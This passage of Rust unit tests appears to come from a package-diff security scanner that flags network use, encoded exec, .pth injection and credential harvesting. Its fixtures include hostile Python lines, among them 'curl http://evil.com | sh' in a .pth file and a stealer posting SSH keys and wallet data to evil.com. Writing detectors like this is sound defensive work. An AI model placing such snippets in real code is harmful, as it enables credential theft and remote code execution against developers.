        let new_dir = dir.path().join("new");
        std::fs::create_dir_all(&old_dir).unwrap();
        std::fs::create_dir_all(&new_dir).unwrap();

        // Old has one file
        std::fs::write(old_dir.join("main.py"), "print('hello')\n").unwrap();

        // New has modified file + added file with network
        std::fs::write(new_dir.join("main.py"), "print('world')\n").unwrap();
        std::fs::write(
            new_dir.join("network.py"),
            "import httpx\nhttpx.get('http://evil.com')\n",
        )
        .unwrap();

        let diff = diff_source_dirs(
            &old_dir,
            &new_dir,
            "test-pkg",
            "1.0",
            "2.0",
            Ecosystem::PyPI,
        );

        assert_eq!(diff.files_added, 1);
        assert_eq!(diff.files_modified, 1);
        assert_eq!(diff.files_removed, 0);
        assert!(diff
            .capability_deltas
            .iter()
            .any(|d| d.capability == Capability::Network && d.is_escalation));
    }

    #[test]
    fn shannon_entropy_high_for_base64() {
        let base64_str = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgYmFzZTY0IGVuY29kaW5n";
        let ent = shannon_entropy(base64_str);
        assert!(ent > 4.0, "base64 should have high entropy, got {ent}");
    }

    #[test]
    fn shannon_entropy_low_for_repeated() {
        let ent = shannon_entropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
        assert!(ent < 0.1, "repeated chars should have low entropy, got {ent}");
    }

    #[test]
    fn find_high_entropy_detects_base64_payload() {
        let source = r#"PAYLOAD = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk""#;
        let results = find_high_entropy_strings(source);
        assert!(!results.is_empty(), "should detect high-entropy string");
    }

    #[test]
    fn encoded_execution_base64_plus_exec() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "backdoor.py".to_string(),
            "import base64\nPAYLOAD = 'aGVsbG8gd29ybGQ='\nexec(base64.b64decode(PAYLOAD))\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(
            patterns
                .iter()
                .any(|p| matches!(p, SuspiciousPattern::EncodedExecution { .. })),
            "should detect exec + base64 as EncodedExecution"
        );
    }

    #[test]
    fn encoded_execution_high_entropy_plus_exec() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "stealer.py".to_string(),
            "PAYLOAD = 'eJzLSM3JyVcozy/KSQEAGgsEHQ==aGVsbG8gd29ybGQgZm9vIGJhciBiYXogcXV4IHF1dXggY29yZ2UgZ3JhdWx0IGdhcnBseSB3YWxkbw=='\nexec(compile(PAYLOAD, '<string>', 'exec'))\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(
            patterns
                .iter()
                .any(|p| matches!(p, SuspiciousPattern::EncodedExecution { .. })),
            "should detect exec + high-entropy string as EncodedExecution"
        );
    }

    #[test]
    fn pth_injection_detected() {
        let dir = tempfile::tempdir().unwrap();
        let pth_path = dir.path().join("evil.pth");
        std::fs::write(&pth_path, "import os; os.system('curl http://evil.com | sh')\n").unwrap();
        let patterns = scan_pth_files(dir.path());
        assert!(!patterns.is_empty(), "should detect .pth injection");
        assert!(matches!(
            &patterns[0],
            SuspiciousPattern::PthInjection { .. }
        ));
    }

    #[test]
    fn pth_safe_path_not_flagged() {
        let dir = tempfile::tempdir().unwrap();
        let pth_path = dir.path().join("safe.pth");
        // Normal .pth files just contain directory paths
        std::fs::write(&pth_path, "/usr/lib/python3/dist-packages\n./lib\n").unwrap();
        let patterns = scan_pth_files(dir.path());
        assert!(patterns.is_empty(), "safe .pth should not be flagged");
    }

    #[test]
    fn scan_ssh_credential_access() {
        let source = "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n";
        let caps = scan_capabilities(source, "stealer.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::CredentialHarvesting));
    }

    #[test]
    fn scan_crypto_wallet_access() {
        let source = "wallet_path = os.path.join(home, '.bitcoin/', 'wallet.dat')\n";
        let caps = scan_capabilities(source, "miner.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::CredentialHarvesting));
    }

    #[test]
    fn scan_ai_credential_access() {
        let source = "key_name = 'ANTHROPIC_API_KEY'\napi_key = get_secret(key_name)\n";
        let caps = scan_capabilities(source, "stealer.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::CredentialHarvesting));
    }

    #[test]
    fn scan_npm_token_access() {
        let source = "import os\nnpmrc = open(os.path.expanduser('~/.npmrc')).read()\n";
        let caps = scan_capabilities(source, "worm.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::CredentialHarvesting));
    }

    #[test]
    fn credential_exfiltration_pattern() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "stealer.py".to_string(),
            "import httpx\nimport os\nkeys = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nwallet = open('.bitcoin/wallet.dat').read()\nhttpx.post('https://evil.com', data=keys+wallet)\n".to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. })));
        // Check that credential types are identified
        if let Some(SuspiciousPattern::CredentialExfiltration {
            credential_types, ..
        }) = patterns
            .iter()
            .find(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. }))
        {
            assert!(
                credential_types.contains(&"ssh_keys".to_string())
                    || credential_types.contains(&"crypto_wallets".to_string())
            );
        }
    }

    #[test]
    fn no_credential_exfiltration_without_network() {
        let mut new_files = HashMap::new();
        // Reading credentials without network is suspicious but not exfiltration
        new_files.insert(
            "reader.py".to_string(),
            "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nprint(key)\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        // Should NOT flag as CredentialExfiltration (no network)
        assert!(!patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. })));
    }
}
